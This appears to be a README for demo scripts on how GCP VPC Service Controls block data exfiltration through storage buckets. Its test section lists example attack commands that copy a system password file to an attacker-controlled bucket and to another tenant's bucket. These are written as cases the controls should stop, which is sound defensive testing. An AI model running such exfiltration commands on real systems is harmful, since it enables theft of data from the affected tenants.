
# VPC Service Controls demo scripts

VPC Service Controls are an excellent tool to prevent data exfiltration and other attack chains.
This repo supports the blog describing this at ___.

In a nutshell, data exfiltration is easy via GCP Storage Buckets despite best parctices to lock down networking with aggressive network egress policy. 
In order for cloud resources like VMs or Functions to access GCP Storage (other services like Cloud SQL or BigQuery also apply) the network proxy
must whitelist GCPs public dns names for the given services. This means an attacker can create a GCP Storage Bucket and exfiltrate to their own Bucket.
VPC Service Controls solve exactly this problem.

## Limitations working with VPC Service Controls
Beware that many services are currently incompatible with VPC Service Controls!
If your project uses these [listed services](https://cloud.google.com/vpc-service-controls/docs/supported-products) you
are in luck. Otherwise you may need to check back later, use separate projects for unsupported services or create access-levels.


## Tests
Let's start with what we are trying to prove. Our scripts support a multi-tenant scenario where a tenant can write to buckets in their own project and
a specific bucket in a project shared amongst all tenants.

The following approved bucket activities should succeed assuming we have ssh'd into a vm.
* Create a bucket in the tenant project
* Upload data to the tenant bucket
* Upload data to the tenant's bucket in the shared project
```
vm-in-tenant1-project> gsutil mb gs://tenant1-project-bucket
vm-in-tenant1-project> gsutil cp localfile.txt gs://tenant1-project-bucket
vm-in-tenant1-project> gsutil cp localfile.txt gs://tenant1-shared-project-bucket --project $SHARED_PROJECT_ID --region $REGION
```

The following malicious exfiltration and tampering activities should fail
* Upload malicious data to another tenant's bucket in the shared project
* Exfiltrate data to a victim tenant bucket in the shared project
* Ingress/Egress to any internet endpoint outside of the VPC
```
vm-in-tenant1-project> gsutil cp /etc/password gs://attacker-controlled-project-bucket
vm-in-tenant1-project> gsutil cp /etc/password gs://tenat2-shared-project-bucket
vm-in-tenant1-project> curl -X GET www.google.com
```
